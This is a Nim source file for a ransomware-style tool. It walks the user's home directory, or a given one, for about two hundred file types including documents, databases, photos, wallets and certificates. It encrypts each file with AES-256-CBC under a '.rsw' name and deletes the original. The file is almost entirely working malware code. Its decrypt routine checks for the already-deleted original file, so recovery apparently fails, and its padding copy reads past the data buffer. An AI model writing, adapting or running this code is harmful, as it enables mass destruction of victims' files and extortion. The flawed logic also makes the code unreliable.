import nimcrypto / [rijndael, bcmode], logging, os, spinny, parseopt
from json import `$`, parseJson
from std / jsonutils import toJson, jsonTo
from strformat import fmt
from strutils import split, strip
from sequtils import foldl

type

    EncryptedFile = object
        path : string
        size : int
        encrypted : bool

    FileData = object
        completed: bool
        filepaths: seq[EncryptedFile]

    Action = enum
        Encrypt, Decrypt, None

const
    FILENAME = "ransomeware.json"
    CONFIG_FILE = getConfigDir() / FILENAME
    FILETYPE = [
        ".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv",
        ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf",
        ".gdb", ".tax", ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf",
        ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg",
        ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo",
        ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf",
        ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip",
        ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x",
        ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc",
        ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba",
        ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset",
        ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav", ".lbf", ".slm", ".odp",
        ".bik", ".epk", ".rgss3a", ".pak", ".big", ".wallet", ".wotreplay",
        ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css", ".rb", ".png",
        ".jpeg", ".txt", ".p7c", ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer",
        ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d", ".rw2", ".rwl", ".raw",
        ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr",
        ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw", ".3fr", ".dng", ".jpe",
        ".jpg", ".cdr", ".indd", ".ai", ".eps", ".pdf", ".pdd", ".psd", ".dbf",
        ".mdf", ".wb2", ".rtf", ".wpd", ".dxg", ".xf", ".dwg", ".pst", ".accdb",
        ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm", ".xlsx",
        ".xls", ".wps", ".docm", ".docx", ".doc", ".odb", ".odc", ".odm",
        ".odp", ".ods", ".odt", ".xls", ".xml", ".bmp", ".css", ".html", ".json",
        ".xlam", ".xla", ".xlsb", ".xltm", ".xltx", ".xlsm", ".xlsx", ".xlm", ".xlt",
    ]

let logger = newConsoleLogger(lvlInfo, fmtStr = "$levelname : [$datetime] ")
logger.addHandler

proc encryptFile(path, privatekey, key_iv : string) : int =

    ## Encrypts the contents of a file and returns the file's size
    let
        original_file = open(path, fmRead)
        encrypted_file = open(path & ".rsw", fmWrite)

    var
        privatekey = privatekey
        key_iv = key_iv
        data = original_file.readAll()
        encryption : CBC[aes256]
        key = newString(aes256.sizeKey)
        iv = newString(aes256.sizeBlock)
        

    if data.len < aes256.sizeBlock:

        result = aes256.sizeBlock
    else:

        if data.len mod aes256.sizeBlock != 0:

            result = aes256.sizeBlock * ((data.len div aes256.sizeBlock) + 1)
        else:

            result = aes256.sizeBlock * (data.len div aes256.sizeBlock)
    
    var 
        normaltext = newString(result)
        encryptedtext = newString(result)

    copyMem(addr normaltext[0], addr data[0], result)
    copyMem(addr key[0], addr privatekey[0], aes256.sizeKey)
    copyMem(addr iv[0], addr key_iv[0], aes256.sizeBlock)
    
    encryption.init(key, iv)
    encryption.encrypt(normaltext, encryptedtext)
    encryption.clear()

    encrypted_file.write(encryptedtext)

    original_file.flushFile()
    encrypted_file.flushFile()

    original_file.close()
    encrypted_file.close()

    removeFile(path)

proc decryptFile(path, privatekey, key_iv : string, size : int) : bool =

    ## Decrypts the content of a file, returns true if successful and false if not
    try:

        let
            original_file = open(path, fmRead)
            pathcontent = path.splitFile
            encrypted_file = open(pathcontent.dir / pathcontent.name, fmWrite)

        var
            privatekey = privatekey
            key_iv = key_iv
            data = original_file.readAll()
            decryption : CBC[aes256]
            key = newString(aes256.sizeKey)
            iv = newString(aes256.sizeBlock)
            encryptedtext = newString(size)
            decryptedtext = newString(size)

        copyMem(addr encryptedtext[0], addr data[0], size)
        copyMem(addr key[0], addr privatekey[0], aes256.sizeKey)
        copyMem(addr iv[0], addr key_iv[0], aes256.sizeBlock)
        
        decryption.init(key, iv)
        decryption.decrypt(encryptedtext, decryptedtext)
        decryption.clear()
        
        encrypted_file.write(decryptedtext)
        
        original_file.flushFile()
        encrypted_file.flushFile()

        original_file.close()
        encrypted_file.close()
        
        removeFile(path)
        return true
    except Exception as e:
    
        return false

proc findAllFiles(path : string = getHomeDir()) =

    var data: FileData
    proc getDirFiles(dir : string) {.closure.} =

        ## Get all files in a directory and it's sub directories recursively
        for kind, path in walkDir(dir) :

            if kind == pcDir:
                
                getDirFiles(path)
            elif kind == pcFile:

                if path.splitFile().ext in FILETYPE:

                    data.filepaths.add(EncryptedFile(path : path, size : 0, encrypted : false))

    let spinner = newSpinny(fmt"Scanning dir {path} and it's sub directories for files", skClock)
    spinner.start()

    getDirFiles(path)
    data.completed = true
    spinner.success("Finished scanning")

    ## Write information of all files to FILENAME
    writeFile(CONFIG_FILE, $toJson(data))
    info(fmt"Saved all discovered files to {CONFIG_FILE}")

proc encryptFiles(key, iv : string) =

    ## Loads data of all discovered files from FILENAME
    let
        file = open(CONFIG_FILE, fmRead)
        content = file.readAll()
        settings = parseJson(content)
        spinner = newSpinny(fmt"Encrypting all discovered files", makeSpinner(skClock.interval, skClock.frames))

    file.flushFile()
    file.close()

    spinner.start()
    var data = settings.jsonTo(FileData)
    for pos in 0..<data.filepaths.len:

        try:

            ## Check if file exists, if it does encrypt it.
            if fileExists(data.filepaths[pos].path):

                data.filepaths[pos].size = encryptFile(data.filepaths[pos].path, key, iv)
                data.filepaths[pos].encrypted = true

        except:

            continue
    
    spinner.success("Finished encryption")

    ## Write information of all files to FILENAME
    writeFile(CONFIG_FILE, $toJson(data))
    info(fmt"Encrypted all files in {CONFIG_FILE}")

proc decryptFiles(key, iv : string) =

    let
        file = open(CONFIG_FILE, fmRead)
        content = file.readAll()
        settings = parseJson(content)
        spinner = newSpinny(fmt"Decrypting all discovered files", makeSpinner(skClock.interval, skClock.frames))

    spinner.start()
    var data = settings.jsonTo(FileData)
    for pos in 0..<data.filepaths.len:
        
        if data.filepaths[pos].encrypted and fileExists(data.filepaths[pos].path):
            
            try:
                
                if decryptFile(data.filepaths[pos].path & ".rsw", key, iv, data.filepaths[pos].size):

                    data.filepaths[pos].encrypted = false
                
            except:

                continue
    
    spinner.success("Finished decryption")

    ## Write information of all files to FILENAME
    writeFile(CONFIG_FILE, $toJson(data))
    info(fmt"Decrypted all files in {CONFIG_FILE}")

when isMainModule:
    
    ## Get and parse cmd parameters
    let
        cmdparams = commandLineParams()
        appname = getAppFilename().split("/")[^1]
        help = fmt"""
            {appname}

            Usage:

                {appname} [options]

            Options:

                --scandir  | -s:[path to dir]                 Scans a dir and it's sub dir for files, if path is not given or directory not found. Scans root dir
                --key      | -k:[encryption key]              Encryption key
                --iv       | -i:[encryption iv]               Encryption iv
                --encrypt  | -e                               Encrypts all discovered files. If {CONFIG_FILE} is not found throws an exception. Requires option key and iv
                --decrypt  | -d                               Decrypts all discovered files. If {CONFIG_FILE} is not found throws an exception. Requires option key and iv
                --help     | -h                               Print's this help message"""

    if cmdparams.len != 0:

        var 
            run_info : tuple[key, iv : string, action : Action] = ("", "", None)
            params = initOptParser(cmdparams.foldl("{a} {b}".fmt))

        while true:

            params.next()
            case params.kind

            of cmdEnd: break
            of cmdShortOption, cmdLongOption:
                
                if params.key == "scandir" or params.key == "s":

                    ## If dir exists scan dir else scan root dir
                    let dir = $params.val
                    if dirExists(dir):

                        findAllFiles(dir)
                    else:

                        findAllFiles()
                elif params.key == "key" or params.key == "k":

                    run_info.key = params.val
                elif params.key == "iv" or params.key == "i":

                    run_info.iv = params.val
                elif params.key == "encrypt" or params.key == "e":

                    run_info.action = Encrypt
                elif params.key == "decrypt" or params.key == "d":

                    run_info.action = Decrypt
                elif params.key == "help" or params.key == "h":

                    for line in help.split("\n"):

                        stdout.writeLine line.strip

            of cmdArgument:

                discard
    
        if run_info.key.len > 0 and run_info.iv.len > 0:

            if fileExists(CONFIG_FILE):

                case run_info.action

                of Encrypt:

                    encryptFiles(run_info.key, run_info.iv)
                of Decrypt:

                    decryptFiles(run_info.key, run_info.iv)
                else:

                    discard
            else:

                raise newException(Exception, fmt"Could not find file {CONFIG_FILE}")
